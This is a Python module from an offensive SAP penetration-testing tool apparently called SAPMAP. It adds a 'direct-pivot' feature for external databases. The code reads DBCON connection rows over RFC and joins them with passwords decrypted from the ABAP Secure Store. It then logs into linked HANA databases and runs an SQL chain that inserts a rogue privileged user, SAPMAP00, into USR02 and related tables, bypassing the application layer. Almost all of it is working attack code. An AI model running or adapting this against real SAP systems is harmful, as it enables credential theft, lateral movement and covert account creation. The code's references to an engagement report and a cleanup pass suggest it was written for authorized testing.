"""ABAP DBCON — external-DB direct-pivot primitive (issue #21).

An ABAP system's DBCON table (SM49 / DBACOCKPIT / tx DBCO) holds
one row per external database the system opens via NATIVE_SQL /
ADBC.  Each row is:

    CON_NAME   – logical name (e.g. HDB_DWH, ORA_LEGACY)
    DBMS       – HDB | ORA | MSS | DB6 | ADA | SYB
    USER_NAME  – DB user
    CON_ENV    – DBMS-specific connect string
                  HDB : ``host:port`` (or ``host:port?databaseName=…``)
                  ORA : TNS descriptor blob or Easy-Connect
                  MSS : ``SERVER=host,port;`` fragments
                  DB6 : ``DB=name;HOST=host;PORT=port``
                  ADA : ``host:dbname``

The password itself is NOT in DBCON — it lives in the ABAP Secure
Store under key ``/DBCON/<CON_NAME>`` (RSECTAB).  When SAPMAP has
already decrypted the SecStore, we have the missing half.

This module pairs the two:

  read_dbcon(source_node, creds)
        Reads DBCON via RFC_READ_TABLE (with USE_ET_DATA_4_RETURN
        set — modern S/4 refuses to fill DATA[] otherwise).
        Returns [{con_name, dbms, user, con_env}, ...].

  integrate_dbcon_from_secstore(source_node, state, creds)
        Runs `read_dbcon`, joins with every `db`-category SecStore
        entry on the node, and appends the resulting complete
        tuples as DBCONConnection dataclasses on
        source_node.dbcon_edges.  Emits an INFO finding per resolved
        edge.  Idempotent — re-runs replace existing edges keyed by
        CON_NAME.

  probe_dbcon_edge(edge)      →   opens the driver-level connection,
                                  probes for USR02 → SAP-shape flag,
                                  reads T000-SYSID when SAP-shape.
                                  Sets edge.tested / reachable /
                                  is_sap_shape / target_sid / error.

  create_sapmap_user_via_dbcon(edge, sid, client, node)
        Runs the same USR02/USR04/UST04/USRBF2 INSERT chain that
        _execute_sql_via_gateway does — but via the direct DB
        driver, no SAPXPG / gateway involvement.  Returns
        {ok, error, verified}.

v1 supports **HANA (HDB) only** — the DBMS field is checked and
non-HDB edges are marked with error="v1 supports HDB only".
Oracle / MSSQL / DB2 support follows in v2.
"""
from __future__ import annotations

import re as _re
from datetime import datetime, timezone
from typing import Optional

from sapmap_models import (
    SAPNode, SAPMAPState, Credentials, DBCONConnection, CreatedUser,
)


# ============================================================================
# DBCON table read via RFC_READ_TABLE
# ============================================================================

def read_dbcon(node: SAPNode, creds: Credentials = None) -> list:
    """Read the DBCON table via RFC_READ_TABLE.

    Modern S/4 kernels refuse to fill RFC_READ_TABLE's DATA
    exporting table unless the caller passes ``USE_ET_DATA_4_RETURN
    = 'X'`` — plain call returns rows count but empty data.  We
    always set that flag; older kernels ignore the parameter, so
    it's safe as a default.

    Returns a list of dicts:
        [{"con_name": "HDB_DWH", "dbms": "HDB", "user": "SAPMAP",
          "con_env": "10.0.0.14:30215"}, ...]
    Empty list on read failure (silent — caller decides whether to
    surface the failure).
    """
    from sapmap_rfc import _get_connection
    from sapmap_config import RFC_READ_TABLE
    from sapmap_errors import format_rfc_exception

    fields = [
        {"FIELDNAME": "CON_NAME"},
        {"FIELDNAME": "DBMS"},
        {"FIELDNAME": "USER_NAME"},
        {"FIELDNAME": "CON_ENV"},
    ]
    try:
        with _get_connection(node, creds) as conn:
            # First: modern kernels — USE_ET_DATA_4_RETURN='X' forces
            # the DATA exporting table to be populated.
            try:
                result = conn.call(
                    RFC_READ_TABLE,
                    QUERY_TABLE="DBCON",
                    DELIMITER="|",
                    FIELDS=fields,
                    ROWCOUNT=500,
                    USE_ET_DATA_4_RETURN="X",
                )
            except Exception:
                # Older kernels reject the extra kwarg — retry without.
                result = conn.call(
                    RFC_READ_TABLE,
                    QUERY_TABLE="DBCON",
                    DELIMITER="|",
                    FIELDS=fields,
                    ROWCOUNT=500,
                )
    except Exception as e:
        print(f"[-] {node.sid}: read_dbcon: RFC_READ_TABLE failed — "
              f"{format_rfc_exception(e)}")
        return []

    rows = []
    for r in result.get("DATA", []) or []:
        parts = [p.strip() for p in (r.get("WA", "") or "").split("|")]
        if len(parts) < 4:
            continue
        con_name, dbms, user_name, con_env = parts[0], parts[1], parts[2], parts[3]
        if not con_name:
            continue
        rows.append({
            "con_name": con_name,
            "dbms":     dbms.upper(),
            "user":     user_name,
            "con_env":  con_env,
        })
    return rows


# ============================================================================
# CON_ENV parsing — DBMS-specific
# ============================================================================

_HDB_HOSTPORT_RE = _re.compile(
    r"(?P<host>[A-Za-z0-9._\-]+):(?P<port>\d+)")
_HDB_DBNAME_RE = _re.compile(
    r"(?:databaseName|DATABASENAME|DB_NAME)\s*=\s*([A-Za-z0-9_]+)",
    _re.IGNORECASE)


def parse_con_env(dbms: str, con_env: str) -> dict:
    """Parse the DBMS-specific CON_ENV field into (host, port, dbname).

    v1 covers HANA precisely; other DBMSs get a best-effort host
    extraction so the panel still shows *something*, but the direct-
    connect path only fires on HDB.
    """
    out = {"host": "", "port": 0, "dbname": ""}
    if not con_env:
        return out
    dbms = (dbms or "").upper()

    if dbms == "HDB":
        m = _HDB_HOSTPORT_RE.search(con_env)
        if m:
            out["host"] = m.group("host")
            try:
                out["port"] = int(m.group("port"))
            except ValueError:
                out["port"] = 0
        m2 = _HDB_DBNAME_RE.search(con_env)
        if m2:
            out["dbname"] = m2.group(1)
        return out

    # Best-effort fallback for other DBMSs — at least surface a host
    # so the operator sees WHERE the DBCON points, even if v1 can't
    # connect there yet.
    m = _re.search(r"(?:HOST|SERVER|ADDRESS)\s*=\s*([A-Za-z0-9._\-]+)",
                   con_env, _re.IGNORECASE)
    if m:
        out["host"] = m.group(1)
    m = _re.search(r"(?:PORT)\s*=\s*(\d+)", con_env, _re.IGNORECASE)
    if m:
        try:
            out["port"] = int(m.group(1))
        except ValueError:
            pass
    return out


# ============================================================================
# Pair RSECTAB `/DBCON/…` entries with DBCON rows
# ============================================================================

def integrate_dbcon_from_secstore(node: SAPNode, state: SAPMAPState,
                                    creds: Credentials = None) -> list:
    """Pair every `db`-category SecStore entry on the node with a
    DBCON row of the same CON_NAME.  Populates node.dbcon_edges
    with a `DBCONConnection` per pair.  Emits one INFO finding per
    resolved edge.  Returns the list of newly-added edges.

    Idempotent — reruns match by CON_NAME and overwrite the
    previous entry (preserves pwned / tested state).
    """
    db_entries = [e for e in (node.secstore_entries or [])
                  if e.get("category") == "db" and e.get("password")]
    if not db_entries:
        return []

    dbcon_rows = read_dbcon(node, creds)
    if not dbcon_rows:
        print(f"[-] {node.sid}: DBCON pair: DBCON table read returned "
              f"no rows — cannot join {len(db_entries)} DB secstore "
              f"entries to host/port info")
        return []
    dbcon_by_name = {r["con_name"].upper(): r for r in dbcon_rows}

    existing_by_name = {e.con_name.upper(): e
                        for e in (node.dbcon_edges or [])}
    added = []

    for entry in db_entries:
        # /DBCON/<name> — ident_clean strips the MANDT prefix
        ident = entry.get("ident_clean") or entry.get("ident") or ""
        m = _re.match(r"^/DBCON/(.+)$", ident)
        if not m:
            continue
        con_name = m.group(1).strip()
        row = dbcon_by_name.get(con_name.upper())
        if not row:
            print(f"[!] {node.sid}: DBCON pair: SecStore has "
                  f"/DBCON/{con_name} but no DBCON row of that "
                  f"CON_NAME — perhaps stale or renamed")
            continue

        parsed = parse_con_env(row["dbms"], row["con_env"])
        prev = existing_by_name.get(con_name.upper())
        edge = DBCONConnection(
            source_sid=node.sid,
            con_name=con_name,
            dbms=row["dbms"],
            host=parsed["host"],
            port=parsed["port"],
            user=row["user"],
            password=entry["password"],
            dbname=parsed["dbname"],
        )
        # Preserve probe verdicts on re-run
        if prev is not None:
            edge.tested       = prev.tested
            edge.reachable    = prev.reachable
            edge.is_sap_shape = prev.is_sap_shape
            edge.target_sid   = prev.target_sid
            edge.pwned        = prev.pwned
            edge.tested_at    = prev.tested_at
        existing_by_name[con_name.upper()] = edge
        added.append(edge)

    node.dbcon_edges = list(existing_by_name.values())

    if added:
        try:
            from sapmap_findings import emit_finding
            for e in added:
                emit_finding(
                    "INFO", node.sid,
                    f"DBCON {e.con_name} resolved: {e.dbms} "
                    f"{e.user}@{e.host}:{e.port} — credentials "
                    f"available for direct-DB pivot",
                    ref="dbcon.resolved",
                    meta={"con_name": e.con_name, "dbms": e.dbms})
        except Exception:
            pass
    return added


# ============================================================================
# Driver-level probe — v1 covers HANA only
# ============================================================================

def _import_hdbcli():
    """Lazy hdbcli import — returns (module, None) or (None, error_str)."""
    try:
        from hdbcli import dbapi
        return dbapi, None
    except Exception as e:
        return None, (f"hdbcli not installed — pip install hdbcli "
                       f"({type(e).__name__}: {e})")


def probe_dbcon_edge(edge: DBCONConnection) -> None:
    """Open a driver-level connection to the DBCON target, mark it
    tested + reachable, and fingerprint what's on the other side
    (SAP-shape via USR02, target_sid via T000).  Mutates the edge
    in-place; sets `error` string on any failure so the panel
    surfaces it.

    v1 supports HDB only — other DBMSs are marked `error="v1 supports
    HDB only"` and left untested.
    """
    edge.tested = True
    edge.tested_at = datetime.now(timezone.utc).isoformat(timespec="seconds")
    edge.error = ""

    if edge.dbms != "HDB":
        edge.error = (f"v1 supports HDB only — {edge.dbms} needs a "
                       f"future driver (cx_Oracle / pyodbc / ibm_db)")
        edge.reachable = False
        print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
              f"{edge.error}")
        return

    dbapi, err = _import_hdbcli()
    if dbapi is None:
        edge.reachable = False
        edge.error = err or "hdbcli import failed"
        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
              f"{edge.error}")
        return

    kwargs = {
        "address":     edge.host,
        "port":        edge.port,
        "user":        edge.user,
        "password":    edge.password,
        "autocommit":  True,
        "communicationTimeout": 15000,
    }
    if edge.dbname:
        kwargs["databaseName"] = edge.dbname

    print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
          f"connecting hdbcli to {edge.host}:{edge.port} as "
          f"{edge.user}"
          + (f" (tenant {edge.dbname})" if edge.dbname else ""))
    conn = None
    try:
        conn = dbapi.connect(**kwargs)
        edge.reachable = bool(conn.isconnected())
        if not edge.reachable:
            edge.error = "connect returned but isconnected() = False"
            return

        # SAP-shape check: USR02 presence
        cur = conn.cursor()
        try:
            cur.execute("SELECT COUNT(*) FROM USR02")
            _ = cur.fetchone()
            edge.is_sap_shape = True
        except Exception:
            edge.is_sap_shape = False
        finally:
            cur.close()

        if edge.is_sap_shape:
            # Grab the SID from T000 to plot on the map
            cur = conn.cursor()
            try:
                cur.execute("SELECT SYSID FROM T000")
                r = cur.fetchone()
                if r and r[0]:
                    edge.target_sid = str(r[0]).strip()
            except Exception:
                pass
            finally:
                cur.close()
            print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
                  f"SAP-shape DB confirmed"
                  + (f" (target SID {edge.target_sid})"
                     if edge.target_sid else "")
                  + " — direct SAPMAP00 create possible")
        else:
            print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
                  f"connected; USR02 not present (non-SAP DB)")
    except Exception as e:
        edge.reachable = False
        edge.error = f"{type(e).__name__}: {e}"
        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
              f"connect failed: {edge.error}")
    finally:
        try:
            if conn is not None:
                conn.close()
        except Exception:
            pass


# ============================================================================
# Direct SAPMAP00 create via the DBCON connection
# ============================================================================

def create_sapmap_user_via_dbcon(edge: DBCONConnection, target_sid: str,
                                   client: str = "000",
                                   state: SAPMAPState = None,
                                   source_node: SAPNode = None) -> dict:
    """Run the SAPMAP00 create-user SQL chain directly via the DBCON
    driver — bypasses RFC + SAPXPG entirely.  Requires the DBCON
    target to be SAP-shape (USR02 present).  Uses the same SQL
    templates as _execute_sql_via_gateway so behaviour matches the
    kernel-relayed path.

    Returns {ok: bool, error: str, verified: bool, statements_ok: int,
             statements_total: int}.
    """
    result = {"ok": False, "error": "", "verified": False,
              "statements_ok": 0, "statements_total": 0}
    if edge.dbms != "HDB":
        result["error"] = (f"v1 supports HDB only, edge dbms={edge.dbms}")
        return result
    if not edge.reachable:
        result["error"] = "edge not reachable — run Test Connection first"
        return result
    if not edge.is_sap_shape:
        result["error"] = "target is not a SAP-shape DB (USR02 missing)"
        return result

    dbapi, err = _import_hdbcli()
    if dbapi is None:
        result["error"] = err
        return result

    from sapmap_config import sql_hana, sapmap_username

    sapmap_user = sapmap_username(0)   # SAPMAP00
    sql_statements = sql_hana(target_sid, client, sapmap_user)
    real_stmts = [s for s in sql_statements
                  if s.strip().upper() != "GO"]
    result["statements_total"] = len(real_stmts)

    print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — direct "
          f"HANA user-creation: {len(real_stmts)} SQL statement(s) "
          f"against {edge.host}:{edge.port}"
          + (f" tenant {edge.dbname}" if edge.dbname else ""))

    kwargs = {
        "address":     edge.host,
        "port":        edge.port,
        "user":        edge.user,
        "password":    edge.password,
        "autocommit":  True,
        "communicationTimeout": 60000,
    }
    if edge.dbname:
        kwargs["databaseName"] = edge.dbname

    conn = None
    try:
        conn = dbapi.connect(**kwargs)
        for idx, sql in enumerate(sql_statements, 1):
            if sql.strip().upper() == "GO":
                continue
            cur = conn.cursor()
            try:
                cur.execute(sql)
                result["statements_ok"] += 1
                print(f"[+] {edge.source_sid}: DBCON {edge.con_name} "
                      f"[{idx}/{len(sql_statements)}] ✓ accepted")
            except Exception as e:
                # HANA raises on duplicate PK for USR02 re-inserts,
                # which is fine on re-run — treat as non-fatal, log
                # but don't abort the chain.
                emsg = str(e)[:200]
                if "unique constraint violated" in emsg.lower():
                    print(f"[*] {edge.source_sid}: DBCON "
                          f"{edge.con_name} [{idx}/{len(sql_statements)}]"
                          f" already exists (re-run) — continuing")
                    result["statements_ok"] += 1
                else:
                    print(f"[-] {edge.source_sid}: DBCON "
                          f"{edge.con_name} [{idx}/{len(sql_statements)}]"
                          f" ✗ rejected: {emsg}")
            finally:
                cur.close()

        # Verify: USR02 row landed?
        cur = conn.cursor()
        try:
            cur.execute(
                "SELECT COUNT(*) FROM USR02 WHERE MANDT=? AND BNAME=?",
                (client, sapmap_user))
            row = cur.fetchone()
            result["verified"] = bool(row and int(row[0]) > 0)
        except Exception as e:
            result["error"] = f"verify failed: {type(e).__name__}: {e}"
        finally:
            cur.close()

        result["ok"] = result["verified"]
        if result["ok"]:
            edge.pwned = True
            print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
                  f"SAPMAP00 created on {target_sid}/{client} via "
                  f"direct HANA connection — verified in USR02")
            # Record as CreatedUser on the source node so the
            # engagement report + cleanup pass see it.
            if source_node is not None:
                try:
                    source_node.created_users.append(CreatedUser(
                        username=sapmap_user,
                        sid=target_sid,
                        client=client,
                        hostname=edge.host,
                        ip=edge.host,
                        instance_nr="00",
                        method="dbcon_direct",
                    ))
                except Exception:
                    pass
        else:
            if not result["error"]:
                result["error"] = ("SQL chain finished but USR02 "
                                    "verify returned 0 rows")
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
    finally:
        try:
            if conn is not None:
                conn.close()
        except Exception:
            pass
    return result
